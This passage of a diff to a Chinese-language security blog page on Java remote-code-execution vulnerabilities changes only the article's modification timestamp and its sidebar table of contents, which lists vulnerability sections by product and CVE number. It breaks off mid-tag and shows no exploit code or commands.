@@ -31,7 +31,7 @@
 <meta property="og:description" content="本文记录Java高危高频利用的RCE漏洞基本原理、利用条件及方法..">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-04-06T14:39:13.000Z">
-<meta property="article:modified_time" content="2022-09-24T07:54:17.737Z">
+<meta property="article:modified_time" content="2022-09-24T08:37:53.669Z">
 <meta property="article:author" content="L0n9w4y">
 <meta property="article:tag" content="Execution">
 <meta property="article:tag" content="Vulnerability">
@@ -121,7 +121,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Fastjson"><span class="nav-text">0x01 Fastjson</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%B2"><span class="nav-text">1. 反序列化漏洞史</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="nav-text">2. 漏洞复现及利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%90%84%E7%89%88%E6%9C%ACpayload"><span class="nav-text">3. 各版本payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-text">Reference</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Apache-Log4j2"><span class="nav-text">0x02 Apache Log4j2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Log4Shell"><span class="nav-text">Log4Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference-1"><span class="nav-text">Reference</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Spring%E7%B3%BB%E5%88%97"><span class="nav-text">0x03 Spring系列</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Spring-WebFlow-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-4971%EF%BC%89"><span class="nav-text">1. Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Spring-Messaging-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1270%EF%BC%89"><span class="nav-text">2. Spring Messaging 远程命令执行漏洞（CVE-2018-1270）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Spring-Data-Commons-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1273%EF%BC%89"><span class="nav-text">3. Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Spring-Cloud-Gateway-Actuator-API-SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2022-22947%EF%BC%89"><span class="nav-text">4. Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Spring-Cloud-Function-SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2022-22963%EF%BC%89"><span class="nav-text">5. Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-Spring-Framework-JDK-gt-x3D-9-RCE%EF%BC%88CVE-2022-22965%EF%BC%89"><span class="nav-text">6. Spring Framework JDK &gt;&#x3D; 9 RCE（CVE-2022-22965）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference-2"><span class="nav-text">Reference</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Apache-Shiro"><span class="nav-text">0x04 Apache Shiro</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Apache-Shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89"><span class="nav-text">1.Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Apache-Shiro-Padding-Oracle-RCE%EF%BC%88CVE-2019-12422%EF%BC%89"><span class="nav-text">2. Apache Shiro Padding Oracle RCE（CVE-2019-12422）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Apache-Shiro-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1957%EF%BC%89"><span class="nav-text">3. Apache Shiro 认证绕过漏洞（CVE-2020-1957）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Apache-Shiro-lt-1-7-1-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17523%EF%BC%89"><span class="nav-text">4. Apache Shiro &lt; 1.7.1 权限绕过漏洞（CVE-2020-17523）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference-3"><span class="nav-text">Reference</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Apache-Solr"><span class="nav-text">0x05 Apache Solr</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Apache-Solr-XXE-amp-RCE-%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12629%EF%BC%89"><span class="nav-text">1. Apache Solr XXE &amp; RCE 漏洞（CVE-2017-12629）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Apache-Solr-DataImport-Handler-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-0193%EF%BC%89"><span class="nav-text">2. Apache Solr DataImport Handler 命令执行漏洞（CVE-2019-0193）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Apache-Solr-Velocity-%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE%EF%BC%88CVE-2019-17558%EF%BC%89"><span class="nav-text">3. Apache Solr Velocity 模版注入RCE（CVE-2019-17558）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Apache-Solr-RemoteStreaming-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E"><span class="nav-text">4. Apache Solr RemoteStreaming 文件读取与SSRF漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Weblogic"><span class="nav-text">0x06 Weblogic</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-10271%EF%BC%89"><span class="nav-text">1. WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Weblogic-WLS-Core-Components-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2628%EF%BC%89"><span class="nav-text">2. Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Weblogic-SSRF%E6%BC%8F%E6%B4%9E"><span class="nav-text">3. Weblogic SSRF漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Weblogic-%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F"><span class="nav-text">4. Weblogic 常规渗透</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-Apache-Tomcat"><span class="nav-text">0x07 Apache Tomcat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Tomcat-PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12615%EF%BC%89"><span class="nav-text">1. Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Apache-Tomcat-AJP-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2020-1938"><span class="nav-text">2. Apache Tomcat AJP 文件读取与包含漏洞 (CVE-2020-1938)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Tomcat7-%E5%BC%B1%E5%8F%A3%E4%BB%A4-amp-amp-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E"><span class="nav-text">3. Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-FasterXML-Jackson"><span class="nav-text">0x08 FasterXML Jackson</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Jackson-databind-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-7525%EF%BC%89"><span class="nav-text">Jackson-databind 反序列化漏洞（CVE-2017-7525）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-Apache-Dubbo"><span class="nav-text">0x09 Apache Dubbo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Aapche-Dubbo-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-17564%EF%BC%89"><span class="nav-text">Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0A-Apache-Flink"><span class="nav-text">0x0A Apache Flink</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Apache-Flink-REST-API-%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2020-17518"><span class="nav-text">1. Apache Flink REST API 文件写入漏洞(CVE-2020-17518)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Apache-Flinkjobmanager-x2F-logs%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86-CVE-2020-17519"><span class="nav-text">2. Apache Flinkjobmanager&#x2F;logs路径遍历 (CVE-2020-17519)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0B-HashiCorp-Consul"><span class="nav-text">0x0B HashiCorp Consul</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-HashiCorp-Consul-API-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-text">1. HashiCorp Consul API 远程命令执行漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-HashiCorp-Consul-RemoteExec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-text">2. HashiCorp Consul RemoteExec 远程命令执行漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0D-JBoss"><span class="nav-text">0x0D JBoss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-JBoss-5-x-x2F-6-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12149%EF%BC%89"><span class="nav-text">1. JBoss 5.x&#x2F;6.x 反序列化漏洞（CVE-2017-12149）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-JBoss-JMXInvokerServlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">2. JBoss JMXInvokerServlet 反序列化漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0E-XStream"><span class="nav-text">0x0E XStream</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-21351%EF%BC%89"><span class="nav-text">1. XStream 反序列化命令执行漏洞（CVE-2021-21351）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-29505%EF%BC%89"><span class="nav-text">2. XStream 反序列化命令执行漏洞（CVE-2021-29505）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0F-Apache-ActiveMQ"><span class="nav-text">0x0F Apache ActiveMQ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-ActiveMQ-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89"><span class="nav-text">1. ActiveMQ 反序列化漏洞（CVE-2015-5254）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Activemq-PUT%E6%96%B9%E6%B3%95%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89"><span class="nav-text">2. Activemq PUT方法文件上传漏洞（CVE-2016-3088）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-Java-RMI"><span class="nav-text">0x10 Java RMI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Java-RMI-Registry-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-lt-x3D-jdk8u111"><span class="nav-text">1. Java RMI Registry 反序列化漏洞(&lt;&#x3D;jdk8u111)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Java-RMI-Registry-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-lt-jdk8u232-b09"><span class="nav-text">2. Java RMI Registry 反序列化漏洞(&lt;jdk8u232_b09)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xFF-Reference"><span class="nav-text">0xFF Reference</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Fastjson"><span class="nav-text">0x01 Fastjson</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%B2"><span class="nav-text">1. 反序列化漏洞史</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="nav-text">2. 漏洞复现及利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%90%84%E7%89%88%E6%9C%ACpayload"><span class="nav-text">3. 各版本payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-text">Reference</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Apache-Log4j2"><span class="nav-text">0x02 Apache Log4j2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Log4Shell"><span class="nav-text">Log4Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference-1"><span class="nav-text">Reference</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Spring%E7%B3%BB%E5%88%97"><span class="nav-text">0x03 Spring系列</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Spring-WebFlow-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-4971%EF%BC%89"><span class="nav-text">1. Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Spring-Messaging-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1270%EF%BC%89"><span class="nav-text">2. Spring Messaging 远程命令执行漏洞（CVE-2018-1270）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Spring-Data-Commons-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1273%EF%BC%89"><span class="nav-text">3. Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Spring-Cloud-Gateway-Actuator-API-SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2022-22947%EF%BC%89"><span class="nav-text">4. Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Spring-Cloud-Function-SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2022-22963%EF%BC%89"><span class="nav-text">5. Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-Spring-Framework-JDK-gt-x3D-9-RCE%EF%BC%88CVE-2022-22965%EF%BC%89"><span class="nav-text">6. Spring Framework JDK &gt;&#x3D; 9 RCE（CVE-2022-22965）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference-2"><span class="nav-text">Reference</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Apache-Shiro"><span class="nav-text">0x04 Apache Shiro</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Apache-Shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89"><span class="nav-text">1.Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Apache-Shiro-Padding-Oracle-RCE%EF%BC%88CVE-2019-12422%EF%BC%89"><span class="nav-text">2. Apache Shiro Padding Oracle RCE（CVE-2019-12422）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Apache-Shiro-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1957%EF%BC%89"><span class="nav-text">3. Apache Shiro 认证绕过漏洞（CVE-2020-1957）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Apache-Shiro-lt-1-7-1-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17523%EF%BC%89"><span class="nav-text">4. Apache Shiro &lt; 1.7.1 权限绕过漏洞（CVE-2020-17523）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference-3"><span class="nav-text">Reference</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Apache-Solr"><span class="nav-text">0x05 Apache Solr</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Apache-Solr-XXE-amp-RCE-%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12629%EF%BC%89"><span class="nav-text">1. Apache Solr XXE &amp; RCE 漏洞（CVE-2017-12629）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Apache-Solr-DataImport-Handler-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-0193%EF%BC%89"><span class="nav-text">2. Apache Solr DataImport Handler 命令执行漏洞（CVE-2019-0193）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Apache-Solr-Velocity-%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE%EF%BC%88CVE-2019-17558%EF%BC%89"><span class="nav-text">3. Apache Solr Velocity 模版注入RCE（CVE-2019-17558）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Apache-Solr-RemoteStreaming-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E"><span class="nav-text">4. Apache Solr RemoteStreaming 文件读取与SSRF漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Weblogic"><span class="nav-text">0x06 Weblogic</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-10271%EF%BC%89"><span class="nav-text">1. WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Weblogic-WLS-Core-Components-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2628%EF%BC%89"><span class="nav-text">2. Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Weblogic-SSRF%E6%BC%8F%E6%B4%9E"><span class="nav-text">3. Weblogic SSRF漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Weblogic-%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F"><span class="nav-text">4. Weblogic 常规渗透</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-Apache-Tomcat"><span class="nav-text">0x07 Apache Tomcat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Tomcat-PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12615%EF%BC%89"><span class="nav-text">1. Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Apache-Tomcat-AJP-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2020-1938"><span class="nav-text">2. Apache Tomcat AJP 文件读取与包含漏洞 (CVE-2020-1938)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Tomcat7-%E5%BC%B1%E5%8F%A3%E4%BB%A4-amp-amp-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E"><span class="nav-text">3. Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-FasterXML-Jackson"><span class="nav-text">0x08 FasterXML Jackson</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Jackson-databind-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-7525%EF%BC%89"><span class="nav-text">Jackson-databind 反序列化漏洞（CVE-2017-7525）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-Apache-Dubbo"><span class="nav-text">0x09 Apache Dubbo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Aapche-Dubbo-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-17564%EF%BC%89"><span class="nav-text">Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0A-Apache-Flink"><span class="nav-text">0x0A Apache Flink</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Apache-Flink-REST-API-%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2020-17518"><span class="nav-text">1. Apache Flink REST API 文件写入漏洞(CVE-2020-17518)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Apache-Flinkjobmanager-x2F-logs%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86-CVE-2020-17519"><span class="nav-text">2. Apache Flinkjobmanager&#x2F;logs路径遍历 (CVE-2020-17519)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0B-HashiCorp-Consul"><span class="nav-text">0x0B HashiCorp Consul</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HashiCorp-Consul-API-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-text">HashiCorp Consul API 远程命令执行漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0D-JBoss"><span class="nav-text">0x0D JBoss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-JBoss-5-x-x2F-6-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12149%EF%BC%89"><span class="nav-text">1. JBoss 5.x&#x2F;6.x 反序列化漏洞（CVE-2017-12149）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-JBoss-JMXInvokerServlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">2. JBoss JMXInvokerServlet 反序列化漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0E-XStream"><span class="nav-text">0x0E XStream</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-21351%EF%BC%89"><span class="nav-text">1. XStream 反序列化命令执行漏洞（CVE-2021-21351）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-29505%EF%BC%89"><span class="nav-text">2. XStream 反序列化命令执行漏洞（CVE-2021-29505）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0F-Apache-ActiveMQ"><span class="nav-text">0x0F Apache ActiveMQ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-ActiveMQ-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89"><span class="nav-text">1. ActiveMQ 反序列化漏洞（CVE-2015-5254）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Activemq-PUT%E6%96%B9%E6%B3%95%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89"><span class="nav-text">2. Activemq PUT方法文件上传漏洞（CVE-2016-3088）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-Java-RMI"><span class="nav-text">0x10 Java RMI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Java-RMI-Registry-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-lt-x3D-jdk8u111"><span class="nav-text">1. Java RMI Registry 反序列化漏洞(&lt;&#x3D;jdk8u111)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 